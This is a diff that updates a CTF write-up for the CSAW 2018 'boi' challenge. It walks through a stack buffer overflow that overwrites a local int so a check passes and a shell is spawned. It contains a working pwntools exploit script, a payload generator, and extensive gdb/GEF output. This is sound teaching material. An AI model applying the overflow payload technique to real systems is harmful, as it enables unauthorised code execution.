@@ -95,7 +95,7 @@ Now to see what our input can reach, we can look at the stack layout in Ghidra. 
 
 ```
 
-Here we can see that according to Ghidra input is stored at offset `-0x38`. We can see that target is stored at offset `-0x24`. This means that there is a `0x14` byte difference between the two values. Sice we can write `0x18` bytes, that means we can fill up the `0x14` byte difference and overwrite four bytes (`0x18 - 0x14 = 4`) of `target`, and since integers are four bytes we can overwrite. Here the bug is it is letting us write `0x18` bytes worth of data to a `0x14` byte space, and `0x4` bytes of data are overflowing into the `target` variable which gives us the ability to change what it is. Taking a look at the memory layout in gdb gives us a better description. We set a breakpoint for directly after the `read` call and see what the memory looks like:
+Here we can see that according to Ghidra input is stored at offset `-0x38`. We can see that the target is stored at offset `-0x24`. This means that there is a `0x14` byte difference between the two values. Since we can write `0x18` bytes, that means we can fill up the `0x14` byte difference and overwrite four bytes (`0x18 - 0x14 = 4`) of `target` with a buffer overflow attack, and since integers are four bytes we can overwrite. Here the bug is letting us write `0x18` bytes worth of data to a `0x14` byte space, and `0x4` bytes of data are overflowing into the `target` variable which gives us the ability to change what it is. Taking a look at the memory layout in gdb gives us a better description. We set a breakpoint for directly after the `read` call and see what the memory looks like:
 
 ```
 gdb ./boi
@@ -182,158 +182,177 @@ gef➤  x/10g 0x7fffffffde80
 0x7fffffffdec0:    0x0    0x7fffffffdf98
 ```
 
-Here we can see that our input `15935728` is `0x14` bytes away. When we give the input `00000000000000000000` + p32(`0xcaf3baee`). We need the hex address to be in least endian (least significant byte first) because that is how the elf will read in data, so we have to pack it that way in order for the binary to read it properly:
+Here we can see that our input `15935728` is `0x14` bytes away. When we give the input `b"00000000000000000000"` + p32(`0xcaf3baee`), that should make it pass the check. We need the hex address to be in least endian (least significant byte first) because that is how the elf will read in data, so we have to pack it that way in order for the binary to read it properly. We have the `generate_input.py` file here, which will generate a file with the input, so we can see how the program will react to our input in a debugger:
 
 ```
-$    python -c 'print "0"*0x14 + "\xee\xba\xf3\xca"' > input
-$    gdb ./boi
-GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
-Copyright (C) 2018 Free Software Foundation, Inc.
+# Import p32 from pwntools
+from pwn import p32
+
+# The Payload
+payload = b"0"*0x14 + p32(0xcaf3baee) + b"\n"
+
+# Write the payload to a file
+
+input_file = open("input", "wb")
+
+input_file.write(payload)
+```
+
+Now let's see how the target responds to our input in a debugger:
+
+```
+$ python3 generate_input.py
+$ gdb ./boi
+GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
+Copyright (C) 2020 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
 This GDB was configured as "x86_64-linux-gnu".
 Type "show configuration" for configuration details.
 For bug reporting instructions, please see:
 <http://www.gnu.org/software/gdb/bugs/>.
 Find the GDB manual and other documentation resources online at:
-<http://www.gnu.org/software/gdb/documentation/>.
+    <http://www.gnu.org/software/gdb/documentation/>.
+
 For help, type "help".
 Type "apropos word" to search for commands related to "word"...
 GEF for linux ready, type `gef' to start, `gef config' to configure
-75 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
-[*] 5 commands could not be loaded, run `gef missing` to know why.
-Reading symbols from ./boi...(no debugging symbols found)...done.
+93 commands loaded for GDB 9.1 using Python engine 3.8
+[*] 3 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from ./boi...
+(No debugging symbols found in ./boi)
 gef➤  b *0x4006a5
 Breakpoint 1 at 0x4006a5
 gef➤  r < input
-Starting program: /Hackery/pod/modules/bof_variable/csaw18_boi/boi < input
+Starting program: /Hackery/nightmare/modules/04-bof_variable/csaw18_boi/boi < input
 Are you a big boiiiii??
+
+Breakpoint 1, 0x00000000004006a5 in main ()
+
 [ Legend: Modified register | Code | Heap | Stack | String ]
-───────────────────────────────────────────────────────────────── registers ────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
 $rax   : 0x18              
-$rbx   : 0x0               
-$rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
+$rbx   : 0x00000000004006e0  →  <__libc_csu_init+0> push r15
+$rcx   : 0x00007ffff7ed5142  →  0x5677fffff0003d48 ("H="?)
 $rdx   : 0x18              
-$rsp   : 0x00007fffffffde70  →  0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"
-$rbp   : 0x00007fffffffdeb0  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
-$rsi   : 0x00007fffffffde80  →  0x3030303030303030 ("00000000"?)
+$rsp   : 0x00007fffffffdf20  →  0x00007fffffffe058  →  0x00007fffffffe375  →  "/Hackery/nightmare/modules/04-bof_variable/csaw18_[...]"
+$rbp   : 0x00007fffffffdf60  →  0x0000000000000000
+$rsi   : 0x00007fffffffdf30  →  0x3030303030303030 ("00000000"?)
 $rdi   : 0x0               
 $rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
-$r8    : 0x0               
-$r9    : 0x0               
-$r10   : 0x3               
+$r8    : 0x18              
+$r9    : 0x7c              
+$r10   : 0xfffffffffffff27d
 $r11   : 0x246             
 $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
-$r13   : 0x00007fffffffdf90  →  0x0000000000000001
+$r13   : 0x00007fffffffe050  →  0x0000000000000001
 $r14   : 0x0               
 $r15   : 0x0               
 $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
-───────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffde70│+0x0000: 0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"     ← $rsp
-0x00007fffffffde78│+0x0008: 0x000000010040072d
-0x00007fffffffde80│+0x0010: 0x3030303030303030     ← $rsi
-0x00007fffffffde88│+0x0018: 0x3030303030303030
-0x00007fffffffde90│+0x0020: 0xcaf3baee30303030
-0x00007fffffffde98│+0x0028: 0x0000000000000000
-0x00007fffffffdea0│+0x0030: 0x00007fffffffdf90  →  0x0000000000000001
-0x00007fffffffdea8│+0x0038: 0x8c0a95a9bb51c400
-─────────────────────────────────────────────────────────────── code:x86:64 ────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdf20│+0x0000: 0x00007fffffffe058  →  0x00007fffffffe375  →  "/Hackery/nightmare/modules/04-bof_variable/csaw18_[...]"  ← $rsp
+0x00007fffffffdf28│+0x0008: 0x000000010040072d
+0x00007fffffffdf30│+0x0010: 0x3030303030303030   ← $rsi
+0x00007fffffffdf38│+0x0018: 0x3030303030303030
+0x00007fffffffdf40│+0x0020: 0xcaf3baee30303030
+0x00007fffffffdf48│+0x0028: 0x0000000000000000
+0x00007fffffffdf50│+0x0030: 0x00007fffffffe050  →  0x0000000000000001
+0x00007fffffffdf58│+0x0038: 0x9aab7afd87d5bf00
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x400698 <main+87>        mov    rsi, rax
      0x40069b <main+90>        mov    edi, 0x0
      0x4006a0 <main+95>        call   0x400500 <read@plt>
- →   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
+●→   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
      0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
      0x4006ad <main+108>       jne    0x4006bb <main+122>
      0x4006af <main+110>       mov    edi, 0x40077c
      0x4006b4 <main+115>       call   0x400626 <run_cmd>
      0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
-─────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: "boi", stopped, reason: BREAKPOINT
-───────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
 [#0] 0x4006a5 → main()
-────────────────────────────────────────────────────────────────────────────────
-
-Breakpoint 1, 0x00000000004006a5 in main ()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤  search-pattern 0000000000
 [+] Searching '0000000000' in memory
-[+] In '/lib/x86_64-linux-gnu/libc-2.27.so'(0x7ffff79e4000-0x7ffff7bcb000), permission=r-x
-  0x7ffff7ba0030 - 0x7ffff7ba003a  →   "0000000000[...]"
+[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f61000-0x7ffff7fab000), permission=r--
+  0x7ffff7f83190 - 0x7ffff7f831a0  →   "0000000000000000"
 [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
-  0x7fffffffde80 - 0x7fffffffde8a  →   "0000000000[...]"
-  0x7fffffffde8a - 0x7fffffffde94  →   "0000000000[...]"
-gef➤  x/10g 0x7fffffffde80
-0x7fffffffde80:    0x3030303030303030    0x3030303030303030
-0x7fffffffde90:    0xcaf3baee30303030    0x0
-0x7fffffffdea0:    0x7fffffffdf90    0x8c0a95a9bb51c400
-0x7fffffffdeb0:    0x4006e0    0x7ffff7a05b97
-0x7fffffffdec0:    0x0    0x7fffffffdf98
+  0x7fffffffdf30 - 0x7fffffffdf3a  →   "0000000000[...]"
+  0x7fffffffdf3a - 0x7fffffffdf44  →   "0000000000[...]"
+gef➤  x/10g 0x7fffffffdf30
+0x7fffffffdf30: 0x3030303030303030  0x3030303030303030
+0x7fffffffdf40: 0xcaf3baee30303030  0x0
+0x7fffffffdf50: 0x7fffffffe050  0x9aab7afd87d5bf00
+0x7fffffffdf60: 0x0 0x7ffff7deb0b3
+0x7fffffffdf70: 0x200000008 0x7fffffffe058
+gef➤  
 ```
 
 Here we can see that we have overwritten the integer with the value `0xcaf3baee`. When we continue onto the `cmp` instruction, we can see that we will pass the check:
 
 ```
-gef➤  b *0x4006a8
-Breakpoint 2 at 0x4006a8
-gef➤  c
-Continuing.
+gef➤  si
+0x00000000004006a8 in main ()
+
 [ Legend: Modified register | Code | Heap | Stack | String ]
-───────────────────────────────────────────────────────────────── registers ────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
 $rax   : 0xcaf3baee        
-$rbx   : 0x0               
-$rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
+$rbx   : 0x00000000004006e0  →  <__libc_csu_init+0> push r15
+$rcx   : 0x00007ffff7ed5142  →  0x5677fffff0003d48 ("H="?)
 $rdx   : 0x18              
-$rsp   : 0x00007fffffffde70  →  0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"
-$rbp   : 0x00007fffffffdeb0  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
-$rsi   : 0x00007fffffffde80  →  0x3030303030303030 ("00000000"?)
+$rsp   : 0x00007fffffffdf20  →  0x00007fffffffe058  →  0x00007fffffffe375  →  "/Hackery/nightmare/modules/04-bof_variable/csaw18_[...]"
+$rbp   : 0x00007fffffffdf60  →  0x0000000000000000
+$rsi   : 0x00007fffffffdf30  →  0x3030303030303030 ("00000000"?)
 $rdi   : 0x0               
 $rip   : 0x00000000004006a8  →  <main+103> cmp eax, 0xcaf3baee
-$r8    : 0x0               
-$r9    : 0x0               
-$r10   : 0x3               
+$r8    : 0x18              
+$r9    : 0x7c              
+$r10   : 0xfffffffffffff27d
 $r11   : 0x246             
 $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
-$r13   : 0x00007fffffffdf90  →  0x0000000000000001
+$r13   : 0x00007fffffffe050  →  0x0000000000000001
 $r14   : 0x0               
 $r15   : 0x0               
 $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
-───────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffde70│+0x0000: 0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"     ← $rsp
-0x00007fffffffde78│+0x0008: 0x000000010040072d
-0x00007fffffffde80│+0x0010: 0x3030303030303030     ← $rsi
-0x00007fffffffde88│+0x0018: 0x3030303030303030
-0x00007fffffffde90│+0x0020: 0xcaf3baee30303030
-0x00007fffffffde98│+0x0028: 0x0000000000000000
-0x00007fffffffdea0│+0x0030: 0x00007fffffffdf90  →  0x0000000000000001
-0x00007fffffffdea8│+0x0038: 0x8c0a95a9bb51c400
-─────────────────────────────────────────────────────────────── code:x86:64 ────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdf20│+0x0000: 0x00007fffffffe058  →  0x00007fffffffe375  →  "/Hackery/nightmare/modules/04-bof_variable/csaw18_[...]"  ← $rsp
+0x00007fffffffdf28│+0x0008: 0x000000010040072d
+0x00007fffffffdf30│+0x0010: 0x3030303030303030   ← $rsi
+0x00007fffffffdf38│+0x0018: 0x3030303030303030
+0x00007fffffffdf40│+0x0020: 0xcaf3baee30303030
+0x00007fffffffdf48│+0x0028: 0x0000000000000000
+0x00007fffffffdf50│+0x0030: 0x00007fffffffe050  →  0x0000000000000001
+0x00007fffffffdf58│+0x0038: 0x9aab7afd87d5bf00
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x40069b <main+90>        mov    edi, 0x0
      0x4006a0 <main+95>        call   0x400500 <read@plt>
-     0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
+●    0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
  →   0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
      0x4006ad <main+108>       jne    0x4006bb <main+122>
      0x4006af <main+110>       mov    edi, 0x40077c
      0x4006b4 <main+115>       call   0x400626 <run_cmd>
      0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
      0x4006bb <main+122>       mov    edi, 0x400786
-─────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: "boi", stopped, reason: BREAKPOINT
-───────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "boi", stopped 0x4006a8 in main (), reason: SINGLE STEP
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
 [#0] 0x4006a8 → main()
-────────────────────────────────────────────────────────────────────────────────
-
-Breakpoint 2, 0x00000000004006a8 in main ()
-gef➤  p $eax
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  p $rax
 $1 = 0xcaf3baee
+gef➤  p $eax
+$2 = 0xcaf3baee
 ```
 
 With all of that, we can write an exploit for this challenge:
 ```
-# Import pwntools
-from pwn import *
+# Import p32 & target from pwntools
+from pwn import p32, process
 
 # Establish the target process
 target = process('./boi')
@@ -342,7 +361,7 @@ target = process('./boi')
 # 0x14 bytes of filler data to fill the gap between the start of our input
 # and the target int
 # 0x4 byte int we will overwrite target with
-payload = "0"*0x14 + p32(0xcaf3baee)
+payload = b"0"*0x14 + p32(0xcaf3baee)
 
 # Send the payload
 target.send(payload)
@@ -353,16 +372,16 @@ target.interactive()
 
 When we run it:
 ```
-$    python exploit.py
-[+] Starting local process './boi': pid 9075
+$ python3 exploit.py
+[+] Starting local process './boi': pid 125407
 [*] Switching to interactive mode
 Are you a big boiiiii??
 $ w
- 23:37:29 up  3:37,  1 user,  load average: 0.81, 0.80, 0.85
+ 20:08:09 up  3:57,  1 user,  load average: 0.00, 0.01, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu :0       :0               20:00   ?xdm?  22:41   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
+guyinatu :0       :0               16:11   ?xdm?   5:09   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
 $ ls
-boi  exploit.py  input    Readme.md
+boi  exploit.py  generate_input.py  input  Readme.md
 ```
 
 Just like that, we popped a shell!
